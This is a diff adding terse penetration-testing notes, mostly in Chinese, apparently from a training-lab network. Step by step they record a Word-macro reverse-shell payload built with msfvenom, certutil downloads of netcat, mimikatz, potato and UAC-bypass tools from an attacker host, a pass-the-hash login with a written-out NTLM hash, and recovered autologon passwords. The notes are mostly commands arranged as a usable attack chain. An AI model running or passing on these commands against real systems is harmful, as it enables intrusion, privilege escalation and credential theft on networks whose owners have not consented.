@@ -1,0 +1,51 @@
+
+nmap -sV -sC -Pn 10.11.1.21 > nmap.txt
+
+
+入口是2的ftp可執行word檔案macro
+
+1.nmap掃描後發現80,21端口,80端口可查看到ftp帳號密碼
+2.生成惡意shellcode的word檔並上傳到ftp（要base64 encode）
+sudo msfvenom -e base64 -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f  hta-psh -o evil.hta
+3.macro的drop-down必須選擇當前文件名字,不可選擇全局
+4.檔案生成後必須先打開一次,enable之後下次才不會出現提醒(檔案不可變動)
+5.上傳ftp時必須使用binary mode
+6.可在本地md5sum及ftp載下來的文件做比對
+7.上傳666.doc後取得reverse shell
+8.上傳winpeas.exe可以查看提權訊息,發現alice跟密碼
+9.嘗試用alice帳密登入21無法，但可登入22,使用UAC bypass可取得root用戶
+10.22機上上sekurlsa::tickets可以看到sv-dc01.svcorp.com ping出得到20這機器
+11.使用getuserspns 獲取20的機器上訊息
+12.22機器上可以dump出sam的ntml hash
+13.使用NTLM HASH直接登入24服務器(只改第二段hash)
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
+14.在24服務器下載nc.exe及winpeas.exe,將winpeas結果回傳到kali用more查看發現pete帳密,嘗試登入20及21
+15.登入21後下載nc.exe及winpeas.exe,將winpeas結果回傳到kali用more查看發現tris帳密,嘗試登入20
+16.使用tris帳密登入20
+
+sudo msfvenom -e base64 -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f  hta-psh -o evil.hta
+
+certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://1/MSFRottenPotato.exe MSFRottenPotato.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/Chimichurri.exe root.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/PowerUp.ps1 PowerUp.ps1
+certutil.exe -urlcache -split -f http://192.168.119.134/winPEAS.exe winPEAS.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/nc.exe nc.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz.exe mimikatz.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz_trunk.exe mimikatz_trunk.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/DccwBypassUAC.exe DccwBypassUAC.exe
+
+
+
+root.exe 192.168.119.134 443
+
+
+C:\Users\alice\Desktop\MSFRottenPotato.exe * C:\Users\alice\Desktop\shell.bat
+
+
+DefaultUserName                      :  35msvcorp\35malice
+DefaultPassword                        :  ThisIsTheUsersPassword01
+
+Some AutoLogon credentials were found!!
+    DefaultUserName               :  35msvcorp\Tris
+    DefaultPassword               :  ThisIsTheUsersPassword22
